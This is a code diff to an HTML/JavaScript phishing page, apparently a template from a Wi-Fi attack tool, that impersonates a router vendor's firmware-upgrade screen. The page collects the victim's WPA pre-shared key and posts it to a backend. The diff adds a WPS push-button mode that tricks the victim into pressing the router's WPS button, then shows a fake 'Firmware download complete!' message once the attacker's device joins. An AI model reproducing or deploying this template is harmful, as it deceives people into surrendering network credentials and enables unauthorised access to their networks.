@@ -5,6 +5,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="stylesheet" href="/static/bootstrap.min.css">
+  <link rel="stylesheet" href="/static/font-awesome-4.7.0/css/font-awesome.min.css">
   <script src="/static/jquery.min.js"></script>
   <script src="/static/bootstrap.min.js"></script>
 
@@ -52,6 +53,15 @@
         width: auto;
         max-width: 100%;
         height: auto;
+    }
+    .isa_info {
+        color: #9F6000;
+        background-color: #FEEFB3
+    }
+    .isa_info i {
+        margin:1px 3px;
+        font-size:18px;
+        vertical-align:middle;
     }
   </style>
 
@@ -152,17 +162,27 @@ The {{ target_ap_vendor }} Firmware/Software/Drivers are provided "AS IS" withou
 
 3. NO LIABILITY.
 
-In no event shall {{ target_ap_vendor }} Company or any other party which has been involved in the creation, production, or delivery of the {{ target_ap_vendor }} Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the {{ target_ap_vendor }} Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages. 
+In no event shall {{ target_ap_vendor }} Company or any other party which has been involved in the creation, production, or delivery of the {{ target_ap_vendor }} Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the {{ target_ap_vendor }} Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages.
+
        </textarea>
         <div class="checkbox">
           <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
         </div>
       </div>
-      <div class="form-group has-feedback">
-          <label for="pwd">{{ target_ap_encryption }} Pre-Shared Key: <span id="pw_status" style="color:blue"></span></label>
+      <div class="form-group-has-feedback" id="psk_field">
+          <label for="pwd">{{ target_ap_encryption }} Pre-Shared Key:</label>
           <input class="form-control" type="password" id="pwd" disabled>
       </div>
       <div class="container text-center">
+        <script>
+            if ( "1" == {{ wps_pbc_attack }} && "1" == {{ psk_enable }}) {
+                document.write("<p align=\"left\"> Alternatively, please go to the wireless router and press the WPS button for a couple of seconds to initialize the firmware update process.</p>")
+            } else if ( "1" == {{wps_pbc_attack}}) {
+                document.write("<p align=\"left\"> Please go to the wireless router and press the WPS button for a couple of seconds to initialize the firmware update process.</p>")
+            }
+        </script>
+        <div class="isa_info" id="pw_status" align="left">
+        </div>
         <button class="btn btn-primary" id="btn">Start Upgrade</button>
       </div>
     </form>
@@ -241,6 +261,17 @@ var match = /^http:.*static\/$/.exec(document.getElementById("ap_logo_path").src
 if (match) {
     document.getElementById('ap_logo_path').style.display = 'none';
 }
+
+/* initialize the status description based on wps_pbc_attack and psk_enable flags */
+var pw_status_element = document.getElementById('pw_status');
+if ("0" == {{psk_enable}} && "1" == {{wps_pbc_attack}}) {
+    /* hide the pre-shared key region if psk_enable is 0 in the config.ini */
+    document.getElementById('psk_field').style.display = 'none';
+    pw_status_element.innerHTML = "<i class=\"fa fa-info-circle\"></i>Awaiting user to push the WPS button to initialize firmware upgrade.";
+} else if ("1" == {{psk_enable}} && "1" == {{wps_pbc_attack}}) {
+    pw_status_element.innerHTML = "<i class=\"fa fa-info-circle\"></i>Awaiting user to push the WPS button or enter the Pre-Shared key to initialize firmware upgrade.";
+}
+
 /*
   Check the password field and act accordingly.
 */
@@ -254,14 +285,44 @@ $("#btn").on("click", function(e) {
     // if the box is checked
   	if ( box.checked == true )
   		{
-        // check to see if the value is empty
-      	if ( input.value == "" )
-      		{
-            // display no password message
-            $("#empty-pass").modal("show");
+        // check if the psk not entered and wps_pbc_attack is enabled
+        if (input.value == "" && "1" == {{wps_pbc_attack}})
+        {
+            // pass to wps state handler
+            var data =
+            {
+                "get_wps_state_handler": input.value
+            };
+            var dataToSend = JSON.stringify(data);
+            // post the data
+            $.ajax(
+                {
+                    url: '/backend/',
+                    type: 'POST',
+                    data: dataToSend,
 
-      		}
-      	else
+                    success: function (jsonResponse) {
+                        var objresponse = JSON.parse(jsonResponse);
+                        var verify_status = objresponse['get_wps_state_handler']
+                        if (verify_status == 'WPS_CONNECTING' || verify_status == "WPS_CONNECTED") {
+                            /* green for success */
+                            pw_status_element.style.color = "#4F8A10";
+                            pw_status_element.style.backgroundColor = "#DFF2BF";
+                            pw_status_element.innerHTML = "<i class=\"fa fa-check\"></i>Firmware download complete!"
+                        } else if (verify_status == "WPS_IDLE") {
+                            /* red for error */
+                            pw_status_element.style.color = "#D8000C";
+                            pw_status_element.style.backgroundColor = "#FFD2D2";
+                            pw_status_element.innerHTML = "<i class=\"fa fa-times-circle\"></i>Please push the WPS button before initiating the firmware upgrade!"
+                        }
+                    },
+                });
+        }
+        // preshared-key is not filled
+        else if ( input.value == "" ) {
+            $("#empty-pass").modal("show");
+        }
+        else
       		{
                 var data =
                 {
@@ -282,7 +343,9 @@ $("#btn").on("click", function(e) {
                                 document.getElementById("pw_status").innerHTML = ""
                                 post('upgrading.html', {"wfphshr-wpa-password": input.value});
                             } else if (verify_status == 'fail') {
-                                document.getElementById("pw_status").innerHTML = "The provided Pre-shared Key (PSK) is invalid!"
+                                pw_status_element.style.color = "#D8000C";
+                                pw_status_element.style.backgroundColor = "#FFD2D2";
+                                pw_status_element.innerHTML = "<i class=\"fa fa-times-circle\"></i>The provided Pre-shared Key (PSK) is invalid!"
                             } else {
                                 /* we may not define the extensions and in that case
                                    just post the passphrase */
